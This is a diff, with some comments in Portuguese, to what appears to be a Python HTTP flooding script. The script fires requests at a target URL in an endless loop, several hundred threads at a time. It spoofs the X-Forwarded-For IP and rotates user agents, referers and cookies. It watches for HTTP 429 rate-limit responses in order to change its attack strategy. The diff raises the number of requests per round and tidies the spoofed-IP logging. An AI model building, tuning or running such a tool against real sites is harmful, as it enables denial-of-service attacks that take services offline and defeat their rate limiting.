@@ -93,12 +93,14 @@ def get_random_key():
 
 def make_request(url, headers, request_count):
     try:
+        # Aqui assumimos que a chave 'X-Forwarded-For' já é configurada em `generate_headers`
+        # e que 'headers' é o argumento passado para `make_request`
+        ip_spoofed = headers.get('X-Forwarded-For', 'Unknown IP')
         with requests.get(url, headers=headers) as response:
-            print(f"Request #{request_count} sent successfully with IP spoofed: {headers['X-Forwarded-For']}")
+            print(f"Request #{request_count} sent successfully with IP spoofed: {ip_spoofed}")
             if response.status_code == 429:
                 print("Detected rate limiting. Adjusting strategy...")
-                # Implement logic to adjust strategy based on rate limiting detection
-                # For example, you could increase the delay between requests or change IP more frequently
+                # Implemente a lógica de ajuste aqui
     except requests.RequestException as e:
         print(f"Erro ao enviar a solicitação #{request_count}: {e}")
 
@@ -110,7 +112,7 @@ request_count = 0
 cookies = [generate_cookie() for _ in range(100)]  # Generate initial set of cookies
 while True:
     threads = []
-    for _ in range(592):  # Number of requests
+    for _ in range(692):  # Number of requests
         user_agent = get_random_user_agent()
         referer = get_random_referer()
         headers = generate_headers(user_agent, referer, cookies)
